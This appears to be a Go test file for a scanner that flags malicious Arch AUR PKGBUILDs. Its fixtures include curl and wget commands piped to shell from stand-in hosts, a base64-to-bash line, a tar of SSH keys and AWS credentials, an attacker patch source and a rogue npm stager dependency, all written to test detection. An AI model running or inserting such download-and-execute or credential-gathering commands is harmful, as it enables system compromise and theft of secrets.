package domain

import "testing"

func findRule(fs []AURFinding, rule string) *AURFinding {
	for i := range fs {
		if fs[i].Rule == rule {
			return &fs[i]
		}
	}
	return nil
}

// A benign -bin PKGBUILD must not trip the scanner.
func TestScanPKGBUILD_Benign(t *testing.T) {
	pb := []byte(`# Maintainer: Someone <a@b.c>
pkgname=ripgrep-bin
pkgver=14.1.0
url="https://github.com/BurntSushi/ripgrep"
source=("https://github.com/BurntSushi/ripgrep/releases/download/$pkgver/ripgrep-$pkgver.tar.gz")
package() {
  install -Dm755 rg "$pkgdir/usr/bin/rg"
}
`)
	res := ScanPKGBUILD(AURPackage{Name: "ripgrep-bin", PKGBUILD: pb, Upstream: ParseUpstreamURL(pb)})
	if res.Verdict != AURAllow {
		t.Fatalf("benign package should Allow, got %s: %+v", res.Verdict, res.Findings)
	}
}

// Chaos RAT (July 2025): malicious "patches" source pointing to an
// attacker github repo unrelated to the declared upstream.
func TestScanPKGBUILD_ChaosRATSourceDrift(t *testing.T) {
	pb := []byte(`pkgname=librewolf-patched
url="https://librewolf.net"
source=("https://librewolf.net/lw.tar.gz"
        "patches::git+https://github.com/danikpapas/zenbrowser-patch.git")
prepare() { cp -r patches/* "$srcdir"; }
`)
	res := ScanPKGBUILD(AURPackage{Name: "librewolf-patched", PKGBUILD: pb, Upstream: ParseUpstreamURL(pb)})
	if findRule(res.Findings, "source-host-drift") == nil {
		t.Fatalf("expected source-host-drift, got %+v", res.Findings)
	}
}

// Atomic Arch (June 2026): foreign npm toolchain + rogue stager dep
// injected into the build.
func TestScanPKGBUILD_AtomicArchNpmInjection(t *testing.T) {
	pb := []byte(`pkgname=some-orphan
url="https://example.org/tool"
build() {
  npm install atomic-lockfile
  node ./stage2.js
}
`)
	res := ScanPKGBUILD(AURPackage{Name: "some-orphan", PKGBUILD: pb, Upstream: ParseUpstreamURL(pb)})
	if findRule(res.Findings, "foreign-toolchain") == nil {
		t.Errorf("expected foreign-toolchain finding")
	}
	if findRule(res.Findings, "ioc-dep") == nil {
		t.Errorf("expected ioc-dep finding for atomic-lockfile")
	}
	if res.Verdict != AURBlock {
		t.Errorf("rogue stager dep must Block, got %s", res.Verdict)
	}
}

func TestScanPKGBUILD_DownloadExec(t *testing.T) {
	cases := map[string]string{
		"curl-pipe-sh":  `build() { curl -fsSL https://evil.host/x.sh | bash; }`,
		"wget-pipe-sh":  `package() { wget -qO- http://1.2.3.4/p | sh; }`,
		"base64-decode": `post_install() { echo aGVsbG8= | base64 -d | bash; }`,
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			res := ScanPKGBUILD(AURPackage{Name: "x", PKGBUILD: []byte(body)})
			if res.Verdict != AURBlock {
				t.Fatalf("%s should Block, got %s: %+v", name, res.Verdict, res.Findings)
			}
		})
	}
}

func TestScanPKGBUILD_CredentialExfil(t *testing.T) {
	pb := []byte(`build() { tar czf /tmp/x.tgz ~/.ssh/id_rsa ~/.aws/credentials; }`)
	res := ScanPKGBUILD(AURPackage{Name: "x", PKGBUILD: pb})
	if findRule(res.Findings, "credential-access") == nil {
		t.Fatalf("expected credential-access, got %+v", res.Findings)
	}
}

func TestScanPKGBUILD_InstallHookNetExec(t *testing.T) {
	res := ScanPKGBUILD(AURPackage{
		Name:     "x",
		PKGBUILD: []byte(`pkgname=x`),
		Install:  []byte(`post_install() { curl -s https://evil/h | sh; }`),
	})
	f := findRule(res.Findings, "download-exec")
	if f == nil || res.Verdict != AURBlock {
		t.Fatalf("install hook net-exec must Block: %+v", res.Findings)
	}
	if f.Where != ".install:post_install()" {
		t.Errorf("wrong location: %s", f.Where)
	}
}

func TestAURPackageDenied(t *testing.T) {
	if !AURPackageDenied("firefox-patch-bin") {
		t.Error("known IOC package should be denied")
	}
	if AURPackageDenied("firefox") {
		t.Error("benign name should not be denied")
	}
	res := ScanPKGBUILD(AURPackage{Name: "firefox-patch-bin", PKGBUILD: []byte("pkgname=firefox-patch-bin")})
	if res.Verdict != AURBlock {
		t.Errorf("denylisted package must Block")
	}
}

func TestParseUpstreamURL(t *testing.T) {
	got := ParseUpstreamURL([]byte("pkgname=x\nurl=\"https://example.org/p\"\n"))
	if got != "https://example.org/p" {
		t.Errorf("got %q", got)
	}
}
